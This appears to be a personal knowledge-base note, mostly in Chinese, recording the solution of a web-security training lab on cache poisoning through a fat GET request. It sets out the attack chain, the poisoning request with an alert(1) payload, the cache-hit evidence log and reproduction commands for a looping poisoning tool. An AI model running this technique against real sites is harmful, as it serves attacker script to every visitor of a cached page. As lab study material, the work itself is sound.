---
title: "lab-web-cache-poisoning-fat-get"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-fat-get

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning via a fat GET request(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
- 实例:https://0a1e005b033dfb6e808a2676002f00a8.web-security-academy.net
- 判定目标:投毒缓存,使访客浏览器执行 `alert(1)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 首页引用 `<script src="/js/geolocate.js?callback=setCountryCookie">`。
   该端点把 `callback` 回显为 JSONP 包装:`setCountryCookie({"country":"United Kingdom"});`。
2. 端点接受 **带 body 的 GET**;后端优先用 **body** 里的 `callback`,而缓存键**只含 URL(query)**、不含 body。
3. 投毒:`GET /js/geolocate.js?callback=setCountryCookie`
   body `callback=alert(1)`(Content-Type: application/x-www-form-urlencoded)
   → 响应 `alert(1)({"country":"United Kingdom"});,` 存进 `?callback=setCountryCookie` 这条键。
4. 复验:同 URL 裸 GET(无 body)→ `X-Cache: hit`,body 是 `alert(1)(...)` → 机制成立。
5. 访客首页加载该脚本 → 执行 `alert(1)`。

## 证据摘录

```
GET /js/geolocate.js?callback=setCountryCookie&cb=x1 (body callback=alert(1))
  -> x-cache: miss; body: …alert(1)({"country":"United Kingdom"});
GET /js/geolocate.js?callback=setCountryCookie&cb=x1 (无 body)
  -> x-cache: hit, age 12; 同一 alert(1) body
solved_check <inst> -> solved: true
```

## 复现命令

```
lab_launch launch 445170885A5022D81BEAF56ED8C332D3CE302FE5D37E99E61A0674D3AC3E6260 --widget-source /web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get --jar /tmp/b9-jar2.json
fatget_poison "<inst>/js/geolocate.js?callback=setCountryCookie" --body 'callback=alert(1)' --header 'Content-Type: application/x-www-form-urlencoded' --interval-secs 4 --count 200 --jar /tmp/b9-jar2.json
solved_check "<inst>" --jar /tmp/b9-jar2.json
```

新件:`fatget_poison`(带 body 的 GET 循环续投;body 不进缓存键的 fat-GET 靶场)。
